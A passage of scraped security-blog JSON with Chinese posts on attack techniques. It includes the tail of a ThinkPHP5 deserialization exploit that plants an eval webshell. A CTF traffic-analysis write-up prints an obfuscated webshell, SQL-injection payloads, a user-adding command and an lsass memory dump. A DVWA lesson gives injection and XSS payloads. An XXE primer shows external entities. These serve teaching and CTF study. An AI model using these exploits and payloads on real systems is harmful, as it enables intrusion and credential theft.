__construct($handle) &#123; $this-&gt;styles = ['getAttr']; $this-&gt;handle =$handle; //$handle-&gt;think\\session\\driver\\Memcached &#125; &#125;&#125;namespace think\\session\\driver &#123; class Memcached &#123; protected $handler; function __construct($handle) &#123; $this-&gt;handler = $handle; //$handle-&gt;think\\cache\\driver\\File &#125; &#125;&#125;namespace think\\cache\\driver &#123; class File &#123; protected $options=null; protected $tag; function __construct()&#123; $this-&gt;options=[ 'expire' =&gt; 3600, 'cache_subdir' =&gt; false, 'prefix' =&gt; '', 'path' =&gt; 'php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode/resource=aaaPD9waHAgQGV2YWwoJF9QT1NUWydjY2MnXSk7Pz4g/../a.php', 'data_compress' =&gt; false, ]; $this-&gt;tag = 'xxx'; &#125; &#125;&#125;namespace &#123; $Memcached = new think\\session\\driver\\Memcached(new \\think\\cache\\driver\\File()); $Output = new think\\console\\Output($Memcached); $model = new think\\db\\Query($Output); $HasOne = new think\\model\\relation\\HasOne($model); $window = new think\\process\\pipes\\Windows(new think\\model\\Pivot($Output,$HasOne)); echo serialize($window); echo base64_encode(serialize($window));&#125; POC效果演示图 参考链接 https://xz.aliyun.com/search?keyword=thinkphp https://y4er.com/post/thinkphp5-rce/#method-__contruct%E5%AF%BC%E8%87%B4%E7%9A%84rce-%E5%90%84%E7%89%88%E6%9C%ACpayload https://www.kancloud.cn/zmwtp/tp5/119422 https://www.anquanke.com/post/id/196364#h2-7","categories":[{"name":"代码审计","slug":"代码审计","permalink":"http://www.r1ght0us.xyz/categories/代码审计/"}],"tags":[{"name":"ThinkPHP","slug":"ThinkPHP","permalink":"http://www.r1ght0us.xyz/tags/ThinkPHP/"},{"name":"PHP","slug":"PHP","permalink":"http://www.r1ght0us.xyz/tags/PHP/"},{"name":"RCE复现","slug":"RCE复现","permalink":"http://www.r1ght0us.xyz/tags/RCE复现/"}]},{"title":"ThinkPHP5底层代码逻辑梳理","slug":"ThinkPHP5底层代码逻辑梳理","date":"2020-07-13T07:58:45.000Z","updated":"2020-07-29T09:37:38.438Z","comments":true,"path":"2020/07/13/ThinkPHP5底层代码逻辑梳理/","link":"","permalink":"http://www.r1ght0us.xyz/2020/07/13/ThinkPHP5底层代码逻辑梳理/","excerpt":"梳理一遍TP代码底层逻辑，为后面的漏洞总结做准备","text":"梳理一遍TP代码底层逻辑，为后面的漏洞总结做准备 环境部署以TP5.0.22为例（为下次的TP-RCE环境做好准备）+ PHP 5.6.27-NTS 目录架构根据类的命名空间可以快速定位文件位置，在ThinkPHP5.0的规范里面，命名空间其实对应了文件的所在目录，app命名空间通常代表了文件的起始目录为application，而think命名空间则代表了文件的其实目录为thinkphp/library/think，后面的命名空间则表示从起始目录开始的子目录，如下图所示： 框架流程我们先进入到默认的入口文件（public/index.php）1234// 定义应用目录define('APP_PATH', __DIR__ . '/../application/');// 加载框架引导文件require __DIR__ . '/../thinkphp/start.php'; 引入start.php进入到里面看看有什么 框架引导文件（thinkphp/start.php）进入框架引导文件看到两行代码123456// ThinkPHP 引导文件// 1. 加载基础文件require __DIR__ . '/base.php';// 2. 执行应用App::run()-&gt;send(); 基础文件（thinkphp/base.php）在此文件首先看到全面大段的是定义常量或者是检查常量是否存在，主要是以下几点需要重点注意 将Loader类引入 注册自动加载机制 注册系统自动加载，spl_autoload_register将函数注册到SPL __autoload函数队列中。如果该队列中的函数尚未激活，则激活它们。此函数可以注册任意数量的自动加载器，当使用尚未被定义的类（class）和接口（interface）时自动去加载。通过注册自动加载器，脚本引擎在 PHP 出错失败前有了最后一个机会加载所需的类。 Composer 自动加载支持 注册命名空间定义:think=&gt;thinkphp/library/think，behavior=&gt;thinkphp/library/behavior，traits=&gt;thinkphp/library/traits 加载类库映射文件 自动加载 extend 目录 注册异常处理机制 加载惯例配置 执行应用（thinkphp/library/think/App.php）首先返回一个request实例，将应用初始化返回配置信息。之后进行如下的操作： 查看是否存在模块控制器绑定 对于request的实例根据设置的过滤规则进行过滤 加载语言包 监听app_dispatch 进行URL路由检测（routecheck后面细讲） 记录当前调度信息，路由以及请求信息到日志中 请求缓存检查并进行$data = self::exec($dispatch, $config);，根据$dispatch进行不同的调度，返回$data 清除类的实例化 输出数据到客户端，$response = $data;，返回一个Response类实例 调用 Response-&gt;send() 方法将数据返回值客户端 总结画个图过一遍整个流程 根据PATH_INFO进行URL路由检测（App::routeCheck）通过$path = $request-&gt;path()可以获得到请求的path_info，$depr是定义的分隔符，默认时:/，之后进行路由检测步骤如下 查看是否存在路由缓存，存在就包含 读取应用所在的路由文件，一般默认为route.php 导入路由配置 Route::check （根据路由定义返回不同的URL调度） 检查解析缓存 替换分隔符，将”/“换成了”|” 获取当前请求类型的路由规则，由于在之前的Composer 自动加载支持，在vendortopthink/think-captcha/src/helper.php中注册了路由，所以在$rules = isset(self::$rules[$method]) ? self::$rules[$method] : [];中的Route::$rules[‘get’]已经存在了相应的路由规则 检测域名部署 检测URL绑定 静态路由规则检查 路由规则检查self::checkRoute($request, $rules, $url, $depr) 检查参数有效性 替换掉路由ext参数 检查分组路由 检查指定特殊路由，例如：__miss__和__atuo__ 检查路由规则checkRule 检查完整规则定义 检查路由的参数分隔符 检查是否完整匹配路由 最终未被匹配路由的进入到self::parseRule(&#39;&#39;, $miss[&#39;route&#39;], $url, $miss[&#39;option&#39;])进行处理，这就牵涉到TP对于路由的多种定义 检查是否强制使用路由$must = !is_null(self::$routeMust) ? self::$routeMust : $config[&#39;url_route_must&#39;] 路由无效，将自动解析模块的URL地址会进入到Route::parseUrl($path, $depr, $config[&#39;controller_auto_search&#39;]) 最终将结果记录到调度信息 总结首先看看路由定义： 定义方式 定义格式 方式1：路由到模块/控制器 (模块/控制器/操作)?额外参数1=值1&amp;额外参数2=值2… 方式2：路由到重定向地址 ‘外部地址’（默认301重定向） 或者 (‘外部地址’,’重定向代码’) 方式3：路由到控制器的方法 ‘@(模块/控制器/)操作’ 方式4：路由到类的方法 ‘\\完整的命名空间类::静态方法’ 或者 ‘\\完整的命名空间类@动态方法’ 方式5：路由到闭包函数 闭包函数定义（支持参数传入） 具体链接可以看看这个开发手册 在画个图过一遍整个路由流程 小章总结TP大概就到这里重要的流程就走完了，后续我会直接复盘RCE漏洞，如果再有什么新增的知识点我会更新章节在本文。 如果文章哪里有错误，恳请大家联系我一起讨论。","categories":[{"name":"代码审计","slug":"代码审计","permalink":"http://www.r1ght0us.xyz/categories/代码审计/"}],"tags":[{"name":"ThinkPHP","slug":"ThinkPHP","permalink":"http://www.r1ght0us.xyz/tags/ThinkPHP/"},{"name":"PHP","slug":"PHP","permalink":"http://www.r1ght0us.xyz/tags/PHP/"}]},{"title":"2018西普杯铁三流量分析","slug":"2018西普杯铁三流量分析","date":"2020-05-26T16:03:03.000Z","updated":"2020-09-16T15:44:20.411Z","comments":true,"path":"2020/05/27/2018西普杯铁三流量分析/","link":"","permalink":"http://www.r1ght0us.xyz/2020/05/27/2018西普杯铁三流量分析/","excerpt":"经典流量分析题目，每次都要拿出来用索性整理好下次方便点","text":"经典流量分析题目，每次都要拿出来用索性整理好下次方便点 本文所用的WireShark语法12345http 显示出所有的HTTP协议数据ip.addr == xxxx 显示出所有数据中地址为xxxx的包ip.src == xxxx 显示出所有数据中源地址为xxxx的包ip.dst == xxxx 显示出所有数据中目的地址为xxxx的包mysql 显示所有的MySQL协议 问题0x01 黑客攻击的第一个受害主机的网卡IP地址过滤出http协议后简单翻阅数据包发现，一个主机对一个服务器进行了请求，之后又发现该主机对服务器进行SQL注入,从而确定黑客IP为： 202.1.1.2 。 0x02 黑客对URL的哪一个参数实施了SQL注入根据前面看到的SQL注入很明显的发现了黑客对 list[select] 进行了注入 0x03 第一个受害主机网站数据库的表前缀根据前面看到的SQL注入，然后进行追踪HTTP流看到服务器报错使之表前缀显示了出来 简单看一下SQLMAP如何进行注入的1XfqR=2916 AND 1=1 UNION ALL SELECT 1,NULL,'&lt;script&gt;alert(\"XSS\")&lt;/script&gt;',table_name FROM information_schema.tables WHERE 2&gt;1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')# 可以看到 XfqR=2916 不成立导致报错产生，从而出来敏感信息。 0x04 第一个受害主机网站数据库的名字黑客最后一条数据爆出来肯定存在相应的数据库名，例如 from A.BA是数据库名，B是表名。查看最后一条SQL注入信息解码注入信息可得1(UPDATEXML(6315,CONCAT(0x2e,0x71717a7671,(SELECT MID((IFNULL(CAST(username AS CHAR),0x20)),1,22) FROM joomla.ajtuc_users ORDER BY id LIMIT 0,1),0x71716b6b71),4235)) 可以看到数据库名以及表名前缀，更加证实了前面一道题的可靠性。 0x05 Joomla后台管理员的密码是多少使用ip.dst == 192.168.1.8 &amp;&amp; http contains &quot;password&quot;查看得到三个数据 12345Status: 500 XPATH syntax error: 'qqzvq$2y$10$lXujU7XaUviJDigqqkkq' SQL=SELECT (UPDATEXML(5928,CONCAT(0x2e,0x71717a7671,(SELECT MID((IFNULL(CAST(password AS CHAR),0x20)),1,22) FROM joomla.ajtuc_users ORDER BY id LIMIT 0,1),0x71716b6b71),7096)),uc.name AS editor FROM `ajtuc_ucm_history` AS h LEFT JOIN ajtuc_users AS uc ON uc.id = h.editor_user_id WHERE `h`.`ucm_item_id` = 1 AND `h`.`ucm_type_id` = 1 ORDER BY `h`.`save_date`Status: 500 XPATH syntax error: 'qqzvqFMzKy6.wx7EMCBqpzrJdn7qqkkq' SQL=SELECT (UPDATEXML(3613,CONCAT(0x2e,0x71717a7671,(SELECT MID((IFNULL(CAST(password AS CHAR),0x20)),23,22) FROM joomla.ajtuc_users ORDER BY id LIMIT 0,1),0x71716b6b71),7939)),uc.name AS editor FROM `ajtuc_ucm_history` AS h LEFT JOIN ajtuc_users AS uc ON uc.id = h.editor_user_id WHERE `h`.`ucm_item_id` = 1 AND `h`.`ucm_type_id` = 1 ORDER BY `h`.`save_date`Status: 500 XPATH syntax error: 'qqzvqzi/8B2QRD7qIlDJeqqkkq' SQL=SELECT (UPDATEXML(8949,CONCAT(0x2e,0x71717a7671,(SELECT MID((IFNULL(CAST(password AS CHAR),0x20)),45,22) FROM joomla.ajtuc_users ORDER BY id LIMIT 0,1),0x71716b6b71),3079)),uc.name AS editor FROM `ajtuc_ucm_history` AS h LEFT JOIN ajtuc_users AS uc ON uc.id = h.editor_user_id WHERE `h`.`ucm_item_id` = 1 AND `h`.`ucm_type_id` = 1 ORDER BY `h`.`save_date` 随后看到相关加密字符串：$2y$10$lXujU7XaUviJDigFMzKy6.wx7EMCBqpzrJdn7zi/8B2QRD7qIlDJe 0x06 黑客第一次获得的php木马的密码是什么还是根据(ip.addr == 192.168.1.8 || ip.addr == 202.1.1.2) &amp;&amp; http发现有一个奇怪的kkkaaa.php文件，其中发现POST方式打开可得一个经典的WEBSHELL，发现密码为 zzz 0x07 黑客第二次上传php木马是什么时间因为黑客又上传了一次马，所以索性按照POST过滤查看(ip.addr == 192.168.1.8 || ip.addr == 202.1.1.2) &amp;&amp; http.request.method==post 发现其中一个数据包所含大量的16进制数据： 将其提取出来，转换如下所示：1234567891011121314151617181920&lt;?php$p='l&gt;]ower\";$i&gt;]=$m[1][0].$m[1]&gt;][1];$h&gt;]=$&gt;]sl($ss(m&gt;]d5($i.&gt;]$kh),0&gt;],3))&gt;];$f=$s&gt;]l($s&gt;]s(md5';$d=']q=array_v&gt;]&gt;]alues(&gt;]$q);&gt;]preg_match_a&gt;]ll(\"/(&gt;][\\\\w]&gt;])[\\\\w-&gt;]]+&gt;](?:;q=&gt;]0.([\\\\d]))?,?/\",&gt;';$W='),$ss(&gt;]$s[&gt;]$i],&gt;]0,$e))),$&gt;]&gt;]k)));&gt;]$o=ob_get_content&gt;]&gt;]s();ob_end_&gt;]&gt;]clean();$d=&gt;]base';$e=']T_LANGUAGE\"];if($rr&gt;]&amp;&amp;$&gt;]ra)&#123;$&gt;]u=pars&gt;]e_&gt;]url($rr);par&gt;]se_st&gt;]r($u[\"&gt;]query\"],$&gt;]q);$&gt;';$E='&gt;]64_e&gt;]ncod&gt;]e&gt;](&gt;]x(gz&gt;]compress($o),$k));pri&gt;]nt(\"&lt;$k&gt;$d&lt;&gt;]/$k&gt;\"&gt;])&gt;];@&gt;]session_destr&gt;]oy();&#125;&#125;&#125;&#125;';$t='($i.&gt;]$kf),0,3&gt;]));$p&gt;]=\"\";fo&gt;]r($z=1&gt;];$z&lt;&gt;]count($m&gt;][1]);$z+&gt;]&gt;]+)$p&gt;].=$q[$m[&gt;]2][$z]];i&gt;';$M=']$ra,$&gt;]m);if($q&gt;]&amp;&amp;$m&gt;])&#123;@sessi&gt;]on_sta&gt;]&gt;]rt();$s=&amp;$&gt;]_SESS&gt;]ION;$&gt;]&gt;]s&gt;]s=\"substr\";$sl=\"s&gt;]&gt;]trto';$P=']f(s&gt;]tr&gt;]pos($p&gt;],$h)===0)&#123;$s[&gt;]$i]=\"\";$p&gt;]=$ss($&gt;]p,3);&gt;]&#125;if(ar&gt;]ray&gt;]_key_exist&gt;]&gt;]s($i,$&gt;]s)&gt;])&#123;$&gt;';$j=str_replace('fr','','cfrrfreatfrfre_funcfrtfrion');$k='];&#125;&#125;re&gt;]&gt;]turn $o;&gt;]&#125;$&gt;]r=$_SERV&gt;]ER;$rr=@$r[&gt;]\"HTTP&gt;]_REFERE&gt;]R\"];$ra&gt;]=@&gt;]$r[\"&gt;]HTTP_A&gt;]CC&gt;]EP&gt;';$g='\"\";for(&gt;]$i=&gt;]0;$i&lt;$l;&gt;])&gt;]&#123;for($j=0;($j&lt;&gt;]$c&amp;&amp;&gt;]$i&lt;$l);$&gt;]j++,$i&gt;]++)&#123;$o.&gt;]=$t&#123;$i&gt;]&#125;^$k&#123;$j&#125;&gt;';$R='$k&gt;]h=\"cb4&gt;]2\";$kf=\"e130\"&gt;];functio&gt;]n&gt;] x($t&gt;],$k)&#123;$c=s&gt;]trle&gt;]&gt;]n($k);$l=strle&gt;]n&gt;]($t)&gt;];$o=';$Q=']s[$i].=$p;$e=strp&gt;]&gt;]os(&gt;]$s[$i&gt;]],$f);if($&gt;]e)&#123;$k=$kh.$k&gt;]f;&gt;]ob_sta&gt;]rt();@e&gt;]val(@gzun&gt;]co&gt;';$v=']mpress(@x&gt;](@b&gt;]as&gt;]&gt;]e64_decode(pr&gt;]&gt;]e&gt;]g_repla&gt;]ce(array(\"/_/\",\"/-/\"),arr&gt;]ay(&gt;]\"/\",\"+\"&gt;]';$x=str_replace('&gt;]','',$R.$g.$k.$e.$d.$M.$p.$t.$P.$Q.$v.$W.$E);$N=$j('',$x);$N(); //j=create_function;?&gt; 简单的反混淆如下：12345678910111213141516171819202122232425262728293031323334353637$kh=\"cb42\";$kf=\"e130\";function x($t,$k) &#123; $c=strlen($k); $l=strlen($t); $o=\"\"; for ($i=0;$i&lt;$l;) &#123; for ($j=0;($j&lt;$c&amp;&amp;$i&lt;$l);$j++,$i++) &#123; $o.=$t &#123; $i &#125; ^$k &#123; $j &#125; ; &#125; &#125; return $o;&#125;$r=$_SERVER;$rr=@$r[\"HTTP_REFERER\"];$ra=@$r[\"HTTP_ACCEPT_LANGUAGE\"];if($rr&amp;&amp;$ra) &#123; $u=parse_url($rr); parse_str($u[\"query\"],$q); $q=array_values($q); preg_match_all(\"/([\\w])[\\w-]+(?:;q=0.([\\d]))?,?/\",$ra,$m); if($q&amp;&amp;$m) &#123; @session_start(); $s=&amp;$_SESSION; $ss=\"substr\"; $sl=\"strtolower\"; $i=$m[1][0].$m[1][1]; $h=$sl($ss(md5($i.$kh),0,3)); $f=$sl($ss(md5($i.$kf),0,3)); $p=\"\"; for ($z=1;$z$d\");@session_destroy();&#125;&#125;&#125;&#125; 因此基本可以确定第二个木马就是在这个时间上传的：Feb 7, 2018 17:20:44.248365000 中国标准时间 0x08 第二次上传的木马通过HTTP协议中的哪个头传递数据由于上部分的马大概可以看到发现有两个头部进行了变化12$rr=@$r[\"HTTP_REFERER\"];$ra=@$r[\"HTTP_ACCEPT_LANGUAGE\"]; 查看后续数据包，发现包头Accept-Language比较正常，然而Referer看起来有点诡异因此可的木马通过Referer传递协议 0x09 内网主机的mysql用户名和请求连接的密码hash是多少直接搜索mysql过滤，直到第四个包才发现了mysql有关的东西，简单的查看发现黑客是通过爆破才找到的密码，那么直接拉到最后一条爆破记录看到用户名密码为admin:1a3068c3e29e03e3bcfdba6f8669ad23349dc6c4 0x10 php代理第一次被使用时最先连接了哪个IP地址再将其第四个数据包重新过滤为http发现有一个tunnel.php文件里面清晰可见了代理IP为4.2.2.2 0x11 黑客第一次获取到当前目录下的文件列表的漏洞利用请求发生在什么时候获取系统可得为WINDOWS，查询目录文件命令就是 dir ,过滤查询语句就为:ip.addr==192.168.1.8 &amp;&amp; http contains &quot;dir&quot;时间就是： 18:36:59.770782 0x12 黑客在内网主机中添加的用户名和密码是多少往后翻相应的数据包，由于之前的WEBSHELL特征我们能够看到响应的数据包未曾进行加密，所以查看回来的数据包发现黑客执行了 net user 命令解密流量包发现黑可执行的查看用户命令那么往下查数据包，解密流量包看到添加用户1cd/d\"C:\\phpStudy\\WWW\\b2evolution\\install\\test\\\"&amp;net user kaka kaka /add&amp;echo [S]&amp;cd&amp;echo [E] 可以看到添加用户密码为 kaka:kaka 0x13 黑客从内网服务器中下载下来的文件名继续往后翻记录看到一条dump.exe的数据cd/d&quot;C:\\phpStudy\\WWW\\b2evolution\\install\\test\\&quot;&amp;procdump.exe -accepteula -ma lsass.exe&amp;echo [S]&amp;cd&amp;echo [E]继续后看发现一个.dmp文件以及后面大量的相同类型的包猜测此dmp是黑客下载的东西 参考文章 sky.blog shaobaobaoer.blog","categories":[{"name":"CTF","slug":"CTF","permalink":"http://www.r1ght0us.xyz/categories/CTF/"}],"tags":[{"name":"比赛wp","slug":"比赛wp","permalink":"http://www.r1ght0us.xyz/tags/比赛wp/"},{"name":"MISC","slug":"MISC","permalink":"http://www.r1ght0us.xyz/tags/MISC/"},{"name":"流量分析","slug":"流量分析","permalink":"http://www.r1ght0us.xyz/tags/流量分析/"}]},{"title":"DVWA靶场-常见漏洞原理以及防御","slug":"DVWA靶场-常见漏洞原理以及防御","date":"2020-02-17T07:51:45.000Z","updated":"2020-02-17T15:59:30.631Z","comments":true,"path":"2020/02/17/DVWA靶场-常见漏洞原理以及防御/","link":"","permalink":"http://www.r1ght0us.xyz/2020/02/17/DVWA靶场-常见漏洞原理以及防御/","excerpt":"本文章可做DVWA普及课件所用","text":"本文章可做DVWA普及课件所用 暴力破解low查看代码可知，代码中并没有任何防护手段，没有防爆破措施，比如验证码或者是错误登录限制措施，仅仅是设置login参数是否存在。存在暴力破解和SQL注入。 演示自行使用BP以及自带字典。 medium比较代码看出，username和password参数都是经过一次mysql_real_escape_string函数转换。查阅手册可知，这个只是减小了sql注入的可能性但是并不影响暴力破解 演示自行使用BP以及自带字典。 high这个级别的代码加入了CSRF-Token机制，通过抓包可以看到比前面两个等级多了一个参数user_token。查看提交页面，我们发现form表单里还存在一个hidden类型的参数。用户每次都要提交这个参数，服务器收到请求后会优先检查token是否匹配。并且检查username和password参数时又加了一个函数：stripslashes进行去除字符串中的反斜线，然后使用mysql_real_escape_string进一步的防止SQL注入。 impossible查看代码可知，使用可靠的登录次数和频繁登录将会锁定账户，以及在进行SQL查询时使用了预编译，预编译基本上已经杜绝了大部分SQL注入的可能性。 命令注入low查看代码看到两个函数介绍一下：代码逻辑判断就是ping4次，因为Linux系统默认时无限次数ping的。 演示见具体的操作。 medium这里需要注意的是”&amp;&amp;”与” &amp;”的区别： Command 1&amp;&amp;Command 2。先执行Command 1，执行成功后执行Command 2，否则不执行Command 2。 Command 1&amp;Command 2。先执行Command 1，不管是否成功，都会执行Command 2 payload:127.0.0.1&amp;;&amp;ipconfig 详情见具体演示 highCommand 1 | Command 2。“|”是管道符，表示将Command 1的输出作为Command 2的输入，并且只打印Command 2执行的结果。 impossibleexplode将一个字符串变成数组。is_numeric判断是否为数字。 CSRFCSRF，全称Cross-site request forgery，翻译过来就是跨站请求伪造，是指利用受害者尚未失效的身份认证信息（cookie、会话等），诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害人不知情的情况下以受害者的身份向（身份认证信息所对应的）服务器发送请求，从而完成非法操作（如转账、改密等）。CSRF与XSS最大的区别就在于，CSRF并没有盗取cookie而是直接利用。 low见具体演示。 medium多了这么一行代码防止CSRF攻击eregi( $_SERVER[ &#39;SERVER_NAME&#39; ], $_SERVER[ &#39;HTTP_REFERER&#39; ] ) ，就是判断http包里的referer字段包含主机名。 payload：“将1.php改成xxxxxx.php（xxxx为被攻击服务器的主机名）” high &amp;&amp; impossible把这两个放到一块，是因为high这个加入了token，预想情况也是在css中请求修改密码的页面，然后获取其token。但是问题来了，牵涉到了跨域问题，现在的市面上的浏览器是不允许进行跨域请求的。基本就在浏览器层次杜绝了csrf攻击，然后impossible层次中加入了需要原密码才能够修改。 文件包含指当服务器开启allow_url_include选项时，就可以通过php的某些特性函数（include()，require()和include_once()，require_once()）利用url去动态包含文件，此时如果没有对文件来源进行严格审查，就会导致任意文件读取或者任意命令执行。文件包含漏洞分为本地文件包含漏洞与远程文件包含漏洞，远程文件包含漏洞是因为开启了php配置中的allow_url_fopen选项（选项开启之后，服务器允许包含一个远程的文件）。 low未作任何过滤，直接打就行 mediumstr_replace函数就进行了一次，双写绕过直接打。 high出现了一个新函数这个等级配合文件上传打组合拳。 impossible直接白名单了，没辙 文件上传low无任何过滤，直接上马菜刀连。 medium基本操作，BP劫包然后改type high结合文件包含打组合拳 impossibleext检测文件格式直接白名单格式锁死 不安全的验证码因为在本地测试，无法fq去访问到Google的验证码。因此无法进行测试验证。 SQL注入基本步骤： 判断是否存在注入，注入是字符型还是数字型 猜解SQL查询语句中的字段数 确定显示的字段顺序 获取当前数据库 获取数据库中的表 获取表中的字段名 下载数据 low没有任何过滤，hackbar打开一把梭。 medium数字型注入，那么这个mysql_real_escape_string就基本失去了作用。payload： 1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() 1 union select 1,group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39; highHigh级别的查询提交页面与查询结果显示页面不是同一个，也没有执行302跳转，这样做的目的是为了防止一般的sqlmap注入，因为sqlmap在注入过程中，无法在查询提交页面上获取查询的结果，没有了反馈，也就没办法进一步注入。所以说手工永远是机器无法代替的基本功。 在代码逻辑中添加了一个limit 1，但是使用注释符#就注释了，不会产生影响。 impossiblePDO预编译天下第一！！！ SQL盲注1234567输入1’ and length(database())=1 #，显示不存在；输入1’ and length(database())=2 #，显示不存在；输入1’ and length(database())=3 #，显示不存在；输入1’ and length(database())=4 #，显示存在： 1234567891011输入1’ and ascii(substr(databse(),1,1))&gt;97 #，显示存在，说明数据库名的第一个字符的ascii值大于97（小写字母a的ascii值）；输入1’ and ascii(substr(databse(),1,1))&lt;122 #，显示存在，说明数据库名的第一个字符的ascii值小于122（小写字母z的ascii值）；输入1’ and ascii(substr(databse(),1,1))&lt;109 #，显示存在，说明数据库名的第一个字符的ascii值小于109（小写字母m的ascii值）；输入1’ and ascii(substr(databse(),1,1))&lt;103 #，显示存在，说明数据库名的第一个字符的ascii值小于103（小写字母g的ascii值）；输入1’ and ascii(substr(databse(),1,1))&lt;100 #，显示不存在，说明数据库名的第一个字符的ascii值不小于100（小写字母d的ascii值）；输入1’ and ascii(substr(databse(),1,1))&gt;100 #，显示不存在，说明数据库名的第一个字符的ascii值不大于100（小写字母d的ascii值），所以数据库名的第一个字符的ascii值为100，即小写字母d。 以此类推即可。 XSS（反射）XSS，全称Cross Site Scripting，即跨站脚本攻击，某种意义上也是一种注入攻击，是指攻击者在页面中注入恶意的脚本代码，当受害者访问该页面时，恶意代码会在其浏览器上执行，需要强调的是，XSS不仅仅限于JavaScript，还包括flash等其它脚本语言。根据恶意代码是否存储在服务器中，XSS可以分为存储型的XSS与反射型的XSS。 DOM型的XSS由于其特殊性，常常被分为第三种，这是一种基于DOM树的XSS。例如服务器端经常使用document.boby.innerHtml等函数动态生成html页面，如果这些函数在引用某些变量时没有进行过滤或检查，就会产生DOM型的XSS。DOM型XSS可能是存储型，也有可能是反射型。 lowpayload:1&lt;script&gt;alert(/xss/)&lt;/script&gt; medium大小写混合绕过。 highpreg_replace()函数用于正则表达式的搜索和替换，这使得双写绕过、大小写混淆绕过（正则表达式中i表示不区分大小写）不再有效。payload:1&lt;img src=1 onerror=alert(/xss/)&gt; impossible重点函数htmlspecialchars在 HTML 中，某些字符是预留的。在 HTML 中不能使用小于号（&lt;）和大于号（&gt;），这是因为浏览器会误认为它们是标签。如果希望正确地显示预留字符，我们必须在 HTML 源代码中使用字符实体（character entities）。 XSS(存储)原理上跟反射一样，只是将输入的payload存到了数据库里，还是一把梭没啥说的。","categories":[{"name":"靶场","slug":"靶场","permalink":"http://www.r1ght0us.xyz/categories/靶场/"}],"tags":[{"name":"DVWA","slug":"DVWA","permalink":"http://www.r1ght0us.xyz/tags/DVWA/"},{"name":"基础课件","slug":"基础课件","permalink":"http://www.r1ght0us.xyz/tags/基础课件/"}]},{"title":"xml基本知识以及XXE漏洞","slug":"xml基本知识以及XXE漏洞","date":"2019-06-01T13:59:51.000Z","updated":"2020-04-06T13:02:39.849Z","comments":true,"path":"2019/06/01/xml基本知识以及XXE漏洞/","link":"","permalink":"http://www.r1ght0us.xyz/2019/06/01/xml基本知识以及XXE漏洞/","excerpt":"XML外部实体注入攻击&amp;&amp;2020-4-2知识补充","text":"XML外部实体注入攻击&amp;&amp;2020-4-2知识补充 xml是可扩展标记语言(EXtensible Markup Language)的缩写。它与HTML类似同为w3c推荐标准，但是比HTML要严谨。因为它所有的标签一定要闭合。 同时它也可以用自己定义的标签，但是XML是不作为的标记语言，不像HTML，XML只是将数据结构化存储与传输。 XML用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。 xml文档的构建模块 元素 属性 实体 PCDATA CDATA 元素是 XML 以及 HTML 文档的主要构建模块，元素可包含文本、其他元素或者是空的。 12&lt;title&gt;my blog&lt;/title&gt; &lt;writer&gt;r1ght0us is best&lt;/writer&gt; 属性 12&lt;img src=\"r1ght0us.gif\" /&gt; 实体实体是用来定义普通文本的变量。实体引用是对实体的引用。 PCDATAPCDATA 的意思是被解析的字符数据（parsed character data）。PCDATA 是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。 CDATACDATA 的意思是字符数据（character data）。CDATA 是不会被解析器解析的文本。 DTD(文档类型定义) DTD（文档类型定义）的作用是定义 XML 文档的合法构建模块。DTD 可以在 XML 文档内声明，也可以外部引用。 内部声明：&lt;!DOCTYPE 根元素 [元素声明]&gt; 完整实例：12345678910111213&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE note [ &lt;!ELEMENT note (to,from,heading,body)&gt; &lt;!ELEMENT to (#PCDATA)&gt; &lt;!ELEMENT from (#PCDATA)&gt; &lt;!ELEMENT heading (#PCDATA)&gt; &lt;!ELEMENT body (#PCDATA)&gt;]&gt;&lt;note&gt; &lt;to&gt;George&lt;/to&gt; &lt;from&gt;John&lt;/from&gt; &lt;heading&gt;Reminder&lt;/heading&gt; &lt;body&gt;Don't forget the meeting!&lt;/body&gt;&lt;/note&gt; 外部声明（引用外部DTD）：&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt; ex: &lt;!DOCTYPE test SYSTEM &#39;http://www.test.com/evil.dtd&#39;&gt; 完整实例:12345678&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE note SYSTEM \"http://www.test.com/note.dtd\"&gt;&lt;note&gt; &lt;to&gt;George&lt;/to&gt; &lt;from&gt;John&lt;/from&gt; &lt;heading&gt;Reminder&lt;/heading&gt; &lt;body&gt;Don't forget the meeting!&lt;/body&gt;&lt;/note&gt; 而note.dtd的内容为: 12345&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!ELEMENT heading (#PCDATA)&gt;&lt;!ELEMENT body (#PCDATA)&gt; DTD实体 DTD实体是用于定义引用普通文本或特殊字符的快捷方式的变量，可以内部声明或外部引用。实体又分为一般实体和参数实体 一般实体的声明语法: &lt;!ENTITY 实体名 &quot;实体内容“&gt; 引用实体的方式：&amp;实体名； 参数实体只能在DTD中使用，参数实体的声明格式： &lt;!ENTITY % 实体名 “实体内容“&gt;引用实体的方式：%实体名； 内部实体声明:&lt;!ENTITY 实体名称 “实体的值”&gt; ex:&lt;!ENTITY eviltest &quot;eviltest&quot;&gt; 完整实例:1234567&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE test [&lt;!ENTITY writer \"r1ght0us\"&gt;&lt;!ENTITY BLOG \"http://r1ght0us.xyz\"&gt;]&gt;&lt;test&gt;&amp;writer;&amp;BLOG;&lt;/test&gt; 外部实体声明:&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt; 完整实例:123456&lt;?xml version=\"1.0\"?&gt;&lt;!DOCTYPE test [&lt;!ENTITY writer SYSTEM \"https://github.com/r1ght0us\"&gt;&lt;!ENTITY handsome SYSTEM \"http://www.chenguanxin.com\"&gt;]&gt;&lt;author&gt;&amp;writer;&amp;handsome;&lt;/author&gt; 关于XML的几个注意点： 所有的XML标记必须要闭合标签 所有的XML的标签对大小写敏感 XML的属性值必须要加引号 在XML中的五个符号需要实体引用 实体引用 符号 中文解释 &amp;lt; &lt; 小于号 &amp;gt; &gt; 大于号 &amp;amp; &amp; 和号 &amp;apos; ‘ 单引号 &amp;quot; “ 双引号 XXE漏洞 如何构建XXE 